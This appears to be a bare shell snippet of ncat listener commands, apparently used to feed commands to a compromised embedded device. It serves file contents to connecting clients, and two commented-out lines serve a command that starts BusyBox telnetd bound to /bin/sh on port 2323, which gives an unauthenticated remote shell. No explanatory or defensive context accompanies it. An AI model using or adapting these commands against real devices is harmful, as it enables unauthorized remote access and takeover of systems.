ncat -vv -l 444 --keep-open -c 'cat exit' & 
#ncat -vv -l 4444 --keep-open  -c 'echo "/dl/busy/telnetd -l /bin/sh -b 10.0.0.18:2323"'  
#ncat -vv -l 4444 --keep-open  -c 'echo "/dl/busy/bin/telnetd -l /bin/sh -b 0.0.0.0:2323"'  
ncat -v -l 444 --keep-open 
